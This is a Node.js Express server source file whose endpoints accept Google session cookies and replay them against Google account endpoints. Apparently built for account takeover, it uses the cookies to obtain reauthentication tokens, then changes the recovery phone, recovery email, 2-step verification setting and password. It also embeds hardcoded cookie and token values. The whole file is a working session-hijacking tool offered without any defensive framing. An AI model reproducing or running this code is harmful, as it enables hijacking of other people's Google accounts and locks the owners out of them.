const { Curl } = require('node-libcurl')
const bodyParser = require('body-parser')
const express = require('express')

const app = express()

app.use(express.json())
app.use(bodyParser.urlencoded({ extended: false }))

app.listen(process.env.PORT || 3300, ()=>{
    console.log('Listening on port 3000 ...')
})

app.post('/login', async function(req, res) {
    if(req.body.number && req.body.identify) {
        login(res, req.body.number, req.body.identify)
    } else {
        res.end(null)
    }
})

app.post('/rescuephone', async function(req, res) {
    if(req.body) {
        let SID = req.body.SID
        let PSID = req.body.PSID
        let LSID = req.body.LSID
        let HSID = req.body.HSID
        let SSID = req.body.SSID
        let SAPISID = req.body.SAPISID
        if(SID && PSID && LSID && HSID && SSID && SAPISID) {
            let Cookie = 'SID='+SID+'; '
            Cookie += '__Secure-1PSID='+PSID+'; '
            Cookie += 'LSID='+LSID+'; '
            Cookie += 'HSID='+HSID+'; '
            Cookie += 'SSID='+SSID+'; '
            Cookie += 'SAPISID='+SAPISID
            rescuephone(res, Cookie)
        } else {
            res.end(null)
        }
    } else {
        res.end(null)
    }
})

app.post('/CheckCookie', async function(req, res) {
    if(req.body) {
        let SID = req.body.SID
        let PSID = req.body.PSID
        let LSID = req.body.LSID
        let HSID = req.body.HSID
        let SSID = req.body.SSID
        let SAPISID = req.body.SAPISID
        if(SID && PSID && LSID && HSID && SSID && SAPISID) {
            let Cookie = 'SID='+SID+'; '
            Cookie += '__Secure-1PSID='+PSID+'; '
            Cookie += 'LSID='+LSID+'; '
            Cookie += 'HSID='+HSID+'; '
            Cookie += 'SSID='+SSID+'; '
            Cookie += 'SAPISID='+SAPISID
            cookies(res, Cookie)
        } else {
            res.end(null)
        }
    } else {
        res.end(null)
    }
})


app.post('/osid', async function(req, res) {
    if(req.body) {
        let SID = req.body.SID
        let OSIDT = req.body.OSIDT
        let PSID = req.body.PSID
        let HSID = req.body.HSID
        let SSID = req.body.SSID
        let SAPISID = req.body.SAPISID
        if(SID && OSIDT && PSID && HSID && SSID && SAPISID) {
            let Cookie = 'SID='+SID+'; '
            Cookie += 'OSID=Lgh3m_XDdCpAmGim5eO6xW8csVs0m9rLO6I7FHHeiGEViTAiQK_GhRhgeVwISYbsIeMp1g.; '
            Cookie += '__Secure-1PSID='+PSID+'; '
            Cookie += 'HSID='+HSID+'; '
            Cookie += 'SSID='+SSID+'; '
            Cookie += 'SAPISID='+SAPISID
            osid(res, OSIDT ,Cookie)
        } else {
            res.end(null)
        }
    } else {
        res.end(null)
    }
})

app.post('/raptLogin', async function(req, res) {
    if(req.body) {
        let SID = req.body.SID
        let LSID = req.body.LSID
        let PSID = req.body.PSID
        let HSID = req.body.HSID
        let SSID = req.body.SSID
        let RART = req.body.RART
        let APISID = req.body.APISID
        let SAPISID = req.body.SAPISID
        if(SID && LSID && PSID && HSID && SSID && RART && APISID && SAPISID) {
            let Cookie = 'SID='+SID+'; '
            Cookie += 'LSID='+LSID+'; '
            Cookie += '__Secure-1PSID='+PSID+'; '
            Cookie += 'HSID='+HSID+'; '
            Cookie += 'SSID='+SSID+'; '
            Cookie += 'APISID='+APISID+'; '
            Cookie += 'SAPISID='+SAPISID+'; __Host-GAPS=1:K1YZWPO-7rwTZroM2a1_7P5JH9kIJ--uXKz4ecTXNNGDyMSsdW2LB9PncggC_11788hiZhQ5a4AwCGjMAThDUavK5BcBDoUp57jktAFPTm4_mWq2CT-u2nNT_cvvHA:NM9lHMofYMqVL9qd'
            raptLogin(res, RART, Cookie)
        } else {
            res.end(null)
        }
    } else {
        res.end(null)
    }
})

app.post('/phone', async function(req, res) {
    if(req.body) {
        let SID = req.body.SID
        let OSID = req.body.OSID
        let PSID = req.body.PSID
        let HSID = req.body.HSID
        let SSID = req.body.SSID
        let NUMBER = req.body.NUMBER
        let RAPT = req.body.RAPT
        let SAPISID = req.body.SAPISID
        if(SID && OSID && PSID && HSID && SSID && NUMBER && RAPT && SAPISID) {
            let Cookie = 'SID='+SID+'; '
            Cookie += 'OSID='+OSID+'; '
            Cookie += '__Secure-1PSID='+PSID+'; '
            Cookie += 'HSID='+HSID+'; '
            Cookie += 'SSID='+SSID+'; '
            Cookie += 'SAPISID='+SAPISID
            phone(res, NUMBER, RAPT, Cookie)
        } else {
            res.end(null)
        }
    } else {
        res.end(null)
    }
})

app.post('/recovery', async function(req, res) {
    if(req.body) {
        let SID = req.body.SID
        let OSID = req.body.OSID
        let PSID = req.body.PSID
        let HSID = req.body.HSID
        let SSID = req.body.SSID
        let GMAIL = req.body.GMAIL
        let RAPT = req.body.RAPT
        let SAPISID = req.body.SAPISID
        if(SID && OSID && PSID && HSID && SSID && GMAIL && RAPT && SAPISID) {
            let Cookie = 'SID='+SID+'; '
            Cookie += 'OSID='+OSID+'; '
            Cookie += '__Secure-1PSID='+PSID+'; '
            Cookie += 'HSID='+HSID+'; '
            Cookie += 'SSID='+SSID+'; '
            Cookie += 'SAPISID='+SAPISID
            recovery(res, GMAIL, RAPT, Cookie)
        } else {
            res.end(null)
        }
    } else {
        res.end(null)
    }
})

app.post('/verification', async function(req, res) {
    if(req.body) {
        let SID = req.body.SID
        let OSID = req.body.OSID
        let PSID = req.body.PSID
        let HSID = req.body.HSID
        let SSID = req.body.SSID
        let RAPT = req.body.RAPT
        let SAPISID = req.body.SAPISID
        if(SID && OSID && PSID && HSID && SSID && RAPT && SAPISID) {
            let Cookie = 'SID='+SID+'; '
            Cookie += 'OSID='+OSID+'; '
            Cookie += '__Secure-1PSID='+PSID+'; '
            Cookie += 'HSID='+HSID+'; '
            Cookie += 'SSID='+SSID+'; '
            Cookie += 'SAPISID='+SAPISID
            verification(res, RAPT, Cookie)
        } else {
            res.end(null)
        }
    } else {
        res.end(null)
    }
})

app.post('/password', async function(req, res) {
    if(req.body) {
        let SID = req.body.SID
        let OSID = req.body.OSID
        let PSID = req.body.PSID
        let HSID = req.body.HSID
        let SSID = req.body.SSID
        let RAPT = req.body.RAPT
        let PASSWORD = req.body.PASSWORD
        let SAPISID = req.body.SAPISID
        if(SID && OSID && PSID && HSID && SSID && RAPT && PASSWORD && SAPISID) {
            let Cookie = 'SID='+SID+'; '
            Cookie += 'OSID='+OSID+'; '
            Cookie += '__Secure-1PSID='+PSID+'; '
            Cookie += 'HSID='+HSID+'; '
            Cookie += 'SSID='+SSID+'; '
            Cookie += 'SAPISID='+SAPISID
            password(res, PASSWORD, RAPT, Cookie)
        } else {
            res.end(null)
        }
    } else {
        res.end(null)
    }
})

function login(res, number, identify) {
    const curl = new Curl()
    curl.setOpt('URL', 'https://accounts.google.com/signin/v1/lookup')
    curl.setOpt(Curl.option.HTTPHEADER, ['Cookie: __Host-GAPS=1:K1YZWPO-7rwTZroM2a1_7P5JH9kIJ--uXKz4ecTXNNGDyMSsdW2LB9PncggC_11788hiZhQ5a4AwCGjMAThDUavK5BcBDoUp57jktAFPTm4_mWq2CT-u2nNT_cvvHA:NM9lHMofYMqVL9qd', 'Content-Type: application/x-www-form-urlencoded'])
    curl.setOpt(Curl.option.POST, true)
    curl.setOpt(Curl.option.POSTFIELDS, getNumberData(number, identify))
    curl.on('end', function (statusCode, data, headers) {
        try {
            if(headers[0] && headers[0]['location']) {
                let url = headers[0]['location']
                if(url.includes('TL=')) {
                    let index = url.indexOf('TL=')
                    res.end(url.substring(index+3, url.length))
                } else {
                    res.end(null)
                }
            } else {
                res.end(null)
            }
        } catch (e) {
            res.end(null)
        }
        this.close()
    })

    curl.on('error', function () {
        res.end(null)
        curl.close.bind(curl)
    })
    curl.perform()
}

function rescuephone(res, Cookie) {
    const curl = new Curl()
    curl.setOpt('URL', 'https://myaccount.google.com/signinoptions/rescuephone')
    curl.setOpt(Curl.option.HTTPHEADER, ['Cookie: '+Cookie, 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36'])
    curl.on('end', function (statusCode, data, headers) {
        try {
            if(headers[0] && headers[0]['location']) {
                let url = headers[0]['location']
                if(url.includes('rart=')) {
                    let start = url.indexOf('rart=')
                    let token = url.substring(start+5, url.length)
                    if(token.includes('&')) {
                        token = token.substring(0, token.indexOf('&'))
                    }
                    res.end(token)
                } else {
                    res.end(null)
                }
            } else {
                res.end(null)
            }
        } catch (e) {
            res.end(null)
        }
        this.close()
    })

    curl.on('error', function () {
        res.end(null)
        curl.close.bind(curl)
    })
    curl.perform()
}

function raptLogin(res, rart, Cookie) {
    const curl = new Curl()
    curl.setOpt('URL', 'https://accounts.google.com/ServiceLogin?rart='+rart)
    curl.setOpt(Curl.option.HTTPHEADER, ['Cookie: '+Cookie])
    curl.on('end', function (statusCode, data, headers) {
        try {
            if(headers[0] && headers[0]['location']) {
                let url = headers[0]['location']
                if(url.includes('TL=')) {
                    let start = url.indexOf('TL=')
                    let token = url.substring(start+3, url.length)
                    if(token.includes('&')) {
                        token = token.substring(0, token.indexOf('&'))
                    }
                    res.end(token)
                } else {
                    res.end(null)
                }
            } else {
                res.end(null)
            }
        } catch (e) {
            res.end(null)
        }
        this.close()
    })

    curl.on('error', function () {
        res.end(null)
        curl.close.bind(curl)
    })
    curl.perform()
}

function cookies(res, Cookie) {
    const curl = new Curl()
    curl.setOpt('URL', 'https://accounts.google.com/CheckCookie?continue=https%3A%2F%2Fmyaccount.google.com%2Fintro%2Fpersonal-info')
    curl.setOpt(Curl.option.HTTPHEADER, ['Cookie: '+Cookie])
    curl.on('end', function (statusCode, data, headers) {
        try {
            if(headers[0] && headers[0]['location']) {
                let url = decodeURIComponent(headers[0]['location'])
                if(url.includes('osidt=')) {
                    let start = url.indexOf('osidt=')
                    let token = url.substring(start+6, url.length)
                    if(token.includes('&')) {
                        token = token.substring(0, token.indexOf('&'))
                    }
                    res.end(token)
                } else {
                    res.end(null)
                }
            } else {
                res.end(null)
            }
        } catch (e) {
            res.end(null)
        }
        this.close()
    })

    curl.on('error', function () {
        res.end(null)
        curl.close.bind(curl)
    })
    curl.perform()
}

function osid(res, osidt, Cookie) {
    const curl = new Curl()
    curl.setOpt('URL', 'https://myaccount.google.com/accounts/SetOSID?continue=https%3A%2F%2Faccounts.youtube.com%2Faccounts%2FSetSID%3Fssdc%3D1&osidt='+osidt)
    curl.setOpt(Curl.option.HTTPHEADER, ['Cookie: '+Cookie])
    curl.on('end', function (statusCode, data, headers) {
        try {
            if(headers[0] && headers[0]['Set-Cookie']) {
                let Cookies = headers[0]['Set-Cookie']
                let OSID = null
                for(let i=0; i<Cookies.length; i++) {
                    let singelData = Cookies[i]
                    try {
                        let start = singelData.indexOf('=')
                        let end = singelData.indexOf(';')
                        let key = singelData.substring(0, start)
                        if(key == 'OSID') {
                            OSID = singelData.substring(start+1, end)
                        }
                    } catch (e) {}
                }
                if(OSID) {
                    res.end(OSID)
                } else {
                   res.end(null)
                }
            } else {
                res.end(null)
            }
        } catch (e) {
            res.end(null)
        }
        this.close()
    })

    curl.on('error', function () {
        res.end(null)
        curl.close.bind(curl)
    })
    curl.perform()
}

function phone(res, number, rapt, Cookie) {
    const curl = new Curl()
    curl.setOpt('URL', 'https://myaccount.google.com/_/AccountSettingsUi/data/batchexecute?rpcids=ZBoWob&rapt='+rapt)
    curl.setOpt(Curl.option.HTTPHEADER, ['Cookie: '+Cookie, 'Content-Type: application/x-www-form-urlencoded;charset=UTF-8'])
    curl.setOpt(Curl.option.POST, true)
    curl.setOpt(Curl.option.POSTFIELDS, getPhoneData(number))
    curl.on('end', function (statusCode, data, headers) {
        try {
            if(data) {
                res.end(data)
            } else {
                res.end(null)
            }
        } catch (e) {
            res.end(null)
        }
        this.close()
    })

    curl.on('error', function () {
        res.end(null)
        curl.close.bind(curl)
    })
    curl.perform()
}

function recovery(res, gmail, rapt, Cookie) {
    const curl = new Curl()
    curl.setOpt('URL', 'https://myaccount.google.com/_/AccountSettingsUi/data/batchexecute?rpcids=uc1K4d&rapt='+rapt)
    curl.setOpt(Curl.option.HTTPHEADER, ['Cookie: '+Cookie, 'Content-Type: application/x-www-form-urlencoded;charset=UTF-8'])
    curl.setOpt(Curl.option.POST, true)
    curl.setOpt(Curl.option.POSTFIELDS, getRecoveryData(gmail))
    curl.on('end', function (statusCode, data, headers) {
        try {
            if(data) {
                res.end(data)
            } else {
                res.end(null)
            }
        } catch (e) {
            res.end(null)
        }
        this.close()
    })

    curl.on('error', function () {
        res.end(null)
        curl.close.bind(curl)
    })
    curl.perform()
}

function verification(res, rapt, Cookie) {
    const curl = new Curl()
    curl.setOpt('URL', 'https://myaccount.google.com/_/AccountSettingsUi/data/batchexecute?rpcids=GWdvgc&rapt='+rapt)
    curl.setOpt(Curl.option.HTTPHEADER, ['Cookie: '+Cookie, 'Content-Type: application/x-www-form-urlencoded;charset=UTF-8'])
    curl.setOpt(Curl.option.POST, true)
    curl.setOpt(Curl.option.POSTFIELDS, getVerificationData())
    curl.on('end', function (statusCode, data, headers) {
        try {
            if(data) {
                res.end(data)
            } else {
                res.end(null)
            }
        } catch (e) {
            res.end(null)
        }
        this.close()
    })

    curl.on('error', function () {
        res.end(null)
        curl.close.bind(curl)
    })
    curl.perform()
}
function password(res, password, rapt, Cookie) {
    const curl = new Curl()
    curl.setOpt('URL', 'https://myaccount.google.com/_/AccountSettingsUi/data/batchexecute?rpcids=or64jf&rapt='+rapt)
    curl.setOpt(Curl.option.HTTPHEADER, ['Cookie: '+Cookie, 'Content-Type: application/x-www-form-urlencoded;charset=UTF-8'])
    curl.setOpt(Curl.option.POST, true)
    curl.setOpt(Curl.option.POSTFIELDS, getPasswordData(password))
    curl.on('end', function (statusCode, data, headers) {
        try {
            if(data) {
                res.end(data)
            } else {
                res.end(null)
            }
        } catch (e) {
            res.end(null)
        }
        this.close()
    })

    curl.on('error', function () {
        res.end(null)
        curl.close.bind(curl)
    })
    curl.perform()
}

function getNumberData(number, identify) {
    return 'service=accountsettings&OAuthConfig='+encodeURIComponent(JSON.stringify({"19":{"1":"CHROME","23":"CHROME_DICE","2":"77185425430.apps.googleusercontent.com","3":["https://www.google.com/accounts/OAuthLogin"],"6":"15fcb58d-1c1a-4905-8f97-e668f2229cfb"}}))+'&bgresponse='+identify+'&Email='+encodeURIComponent(number)+'&signIn=Next'
}

function getRecoveryData(gmail) {
    return 'f.req='+encodeURIComponent(JSON.stringify([[["uc1K4d","[\"ac.sirerq\",\""+gmail+"\",null,true]",null,"generic"]]]))+'&at=AAluzBgq8wf8CxUVP7NQ3PFB8Srn%3A1656446201674'
}

function getPhoneData(number) {
    return 'f.req='+encodeURIComponent(JSON.stringify([[["ZBoWob","[[3,\""+number+"\",null,null,[1],null,null,null,null,null,[],1]]",null,"generic"]]]))+'&at=AAluzBgq8wf8CxUVP7NQ3PFB8Srn%3A1656446201674'
}

function getVerificationData() {
    return 'f.req=%5B%5B%5B%22GWdvgc%22%2C%22%5B%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at=AAluzBgq8wf8CxUVP7NQ3PFB8Srn%3A1656446201674'
}

function getPasswordData(password) {
    return 'f.req='+encodeURIComponent(JSON.stringify([[["or64jf","[\""+password+"\",null,false]",null,"generic"]]]))+'&at=AAluzBgq8wf8CxUVP7NQ3PFB8Srn%3A1656446201674'
}
